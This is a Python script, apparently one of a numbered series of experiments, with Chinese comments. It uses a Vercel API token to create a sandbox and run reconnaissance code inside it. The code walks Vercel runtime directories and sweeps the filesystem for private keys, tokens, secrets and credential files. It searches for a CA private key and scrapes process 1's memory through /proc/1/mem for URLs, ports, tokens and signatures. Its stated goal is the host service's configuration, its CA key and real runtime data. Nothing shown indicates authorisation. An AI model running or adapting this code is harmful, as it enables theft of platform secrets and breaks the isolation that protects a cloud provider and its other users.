# 实验J29: share/vercel 目录树 + CA私钥搜索 + /proc/1/mem 运行时字符串提取
# 目标: celld 服务端配置(路径/端口/token)、CA 私钥、运行时真实数据
import json, pathlib, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj29"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

RECON = r'''
import os, re, glob, time

print("=== [1] /run/vercel/share 目录 ===", flush=True)
for root, dirs, files in os.walk("/run/vercel"):
    for f in files:
        p = os.path.join(root, f)
        try:
            st = os.lstat(p)
            print(f"{p} size={st.st_size} mode={oct(st.st_mode)}", flush=True)
        except Exception as e:
            print(p, "ERR", e, flush=True)

print("=== [2] /vercel 目录树(2层) ===", flush=True)
for root, dirs, files in os.walk("/vercel"):
    depth = root.count("/")
    if depth > 3:
        dirs[:] = []
        continue
    for f in files:
        p = os.path.join(root, f)
        try:
            st = os.lstat(p)
            print(f"{p} size={st.st_size}", flush=True)
        except Exception as e:
            print(p, "ERR", e, flush=True)

print("=== [3] 找私钥/token/配置类文件 ===", flush=True)
pats = [r".*\.(key|pem|crt|toml|conf|json)$", r".*token.*", r".*secret.*", r".*private.*", r".*credential.*"]
hits = set()
for base in ["/run", "/vercel", "/etc", "/opt", "/home", "/tmp", "/mnt", "/srv"]:
    for root, dirs, files in os.walk(base):
        for f in files:
            p = os.path.join(root, f)
            try:
                if any(re.match(p2, f, re.I) for p2 in pats):
                    if os.path.getsize(p) < 2000000:
                        hits.add(p)
            except Exception:
                pass
for p in sorted(hits)[:80]:
    print("CFG:", p, flush=True)

print("=== [4] CA 私钥搜索 ===", flush=True)
for root, dirs, files in os.walk("/"):
    dirs[:] = [d for d in dirs if d not in ("proc","sys","dev","vercel","usr/lib")]
    for f in files:
        if re.search(r"(key|priv|pkcs|ca)", f, re.I):
            p = os.path.join(root, f)
            try:
                print("KEY:", p, os.path.getsize(p), flush=True)
            except Exception:
                pass

print("=== [5] /proc/1/mem 运行时字符串提取 ===", flush=True)
t0 = time.time()
membuf = {}
try:
    maps = open("/proc/1/maps").read()
except Exception as e:
    print("maps ERR", e, flush=True)
    maps = ""
pat = re.compile(rb"(https?://[^\x00-\x20]{6,}|/run/vercel/[^\x00-\x20]{3,}|\.sock|celld|apm|metrics|containerd|23456|30001|30002|[0-9]{4,5}\b|token|signature|pubkey|VS[0-9A-Za-z]{20,}|hvc_|cell_|vercel[a-z.\-]*\.com|internal[a-z.\-]*\.com|/v[12]/[a-z]|exec|spawn)", re.I)
seen = set()
out = []
for line in maps.splitlines():
    parts = line.split()
    if len(parts) < 2:
        continue
    perms, addr = parts[1], parts[0]
    if "r" not in perms:
        continue
    if "w" not in perms:
        continue
    try:
        start, end = [int(x, 16) for x in addr.split("-")]
    except Exception:
        continue
    if end - start > 100 * 1024 * 1024:
        continue
    try:
        with open("/proc/1/mem", "rb", buffering=0) as mf:
            mf.seek(start)
            chunk = mf.read(end - start)
    except Exception:
        continue
    for s in re.findall(rb"[\x20-\x7e]{6,}", chunk):
        if pat.search(s):
            t = s.decode(errors="replace")
            if t not in seen and len(t) < 250:
                seen.add(t)
                out.append(t)
    if time.time() - t0 > 25:
        print("TIME CUT", flush=True)
        break
print("mem hits:", len(out), "t=%.1fs" % (time.time()-t0), flush=True)
for t in out[:150]:
    print("M:", t, flush=True)
'''
run_cmd(sid, RECON, "recon", wait=True, timeout=120000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
